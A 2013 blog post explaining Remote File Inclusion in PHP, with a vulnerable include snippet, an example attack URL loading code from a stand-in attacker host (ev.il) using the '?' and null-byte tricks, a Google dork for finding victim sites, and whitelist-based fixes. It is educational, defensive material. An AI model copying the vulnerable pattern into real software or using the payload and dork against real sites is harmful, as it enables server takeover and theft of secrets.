---
layout: post
title:  "Remote File Inclusion"
date:   2013-06-18 13:59:40
categories: vulnerabilities
---

Vulnerability Name Remote File Inclusion

Vulnerability Type : High

Description:Most RFI attacks against websites are built on the server-side scripting language PHP. Although PHP is not the only means of RFI, because it is the most popular it is what we’ll use for these examples.

	A common setup that can make a website vulnerable to RFI is when a developer uses PHP to include an external file based on data passed via URL parameter. For example, suppose your website contains links to sub-pages named about, photos and contact. And suppose these links are coded like this:

    index.php?page=about
    index.php?page=photos
    index.php?page=contact

	Now suppose that the PHP code on the server is written to extract the value of the “page” parameter in the URL (e.g. “about”) and uses that to include an external file, such as the content of about.html:

<?php include $_GET['page'].".html"; ?>
	
	At first glance this might seem like a logical way for a PHP script to load a page requested by the user, but it is a recipe for a potentially devastating RFI attack.

How RFI attack look like Example:

	By crafting a malicious URL to your server, the hacker may be able to trick your site into including any file he or she wants. Often, the hacker will have a malicious file planted on a server – let’s suppose the address is http://ev.il/badscript.php. The hacker now wants to execute this code on your server, by sending a request like this:

http://yoursite.com/index.php?page=http://ev.il/badscript.php?

	If the script on the victim server resembles the example from earlier, the server will execute the PHP include statement for the URL:

http://ev.il/badscript.php?.html

	Note how, by using the question mark character, the hacker neutralizes the problem of the “.html” extension that the PHP automatically adds by causing it to become a parameter in the request, which is then ignored. Sometimes hackers will do this by instead using a null byte %00 rather than a question mark. Either way, the victimized server will now execute badscript.php, which is entirely under the hacker’s control.

	The content of badscript.php can perform a wide range of actions, including probing the server it is running on for high-value files and delivering them to the hacker. For example, it could dump the content of all the scripts behind your website, revealing to the hacker any database passwords or other sensitive information which can be used in another, more damaging attack.

How to Finding Victims :

How does a hacker know which sites are coded to use file includes in a vulnerable way? Typically the hackers will scan for sites which use a particular URL syntax. These search queries are known informally as “googledorks.” Using Google with particular search parameters, hackers can generate a list of potential victim sites. For example, a “googledork” that would detect a site coded like our example victim is:

inurl:/index.php?page=

Of course, not every site that Google returns for this search will actually be vulnerable to RFI. It may be that the site does not use file inclusions like those in our example or that it has defended against them. But these searches are a way of narrowing down candidates and applying test queries against them to determine which are actually vulnerable to an RFI attack.

Preventing RFI:

Like all code injection attacks, RFI is a result of allowing unsecure data into a secure context. The best way to prevent an RFI attack is to never use arbitrary input data in a literal file include request.

Taking the example from earlier, a more secure way of implementing this site is by using an array to map the page parameter from the link to actual filenames on the server:

<?php

 $page_files=array( 'about'=>'about.html',

                    'photos'=>'photos.html',

                    'contact'=>'contact.html',

                    'home'=>'home.html'

                  );

 

if (in_array($_GET['page'],array_keys($page_files))) {

      include $page_files[$_GET['page']];

 } else {

      include $page_files['home'];

}

?>

 

 

In this example PHP code, the "page" parameter in the URL is merely a token that maps to the filename defined inside the script. If the URL request does not contain a valid token, the site loads the home page. Therefore it is impossible for a hacker to sneak a malicious RFI into this request.

In some cases it might not be possible to implement this type of architecture. For example, perhaps the site allows a user to create a file of his or her own and then display that file, therefore the filename is not known in advance and must be passed to the script.

You can try to defend against an RFI using a filter to thoroughly scrub input parameters against possible file inclusions. Google will turn up a variety of regular expression filters that can work – in most cases. But there’s the catch: There is always the possibility that any filter won’t catch certain edge cases, and a crafty RFI can still sneak through. It is not worth the risk.

Better yet, build a dynamic whitelist. When a user creates a file, insert that filename into a record (flat file or database) so that when he or she requests the file, the site can verify the filename before executing any include. As in the earlier example, this code logic prevents an RFI attack from being possible.

It is easy to code a site that is vulnerable to an RFI attack. That is why there are so many of them. The extra work in designing a back-end that is immune to RFI is well worth it compared to the risks of a major breach.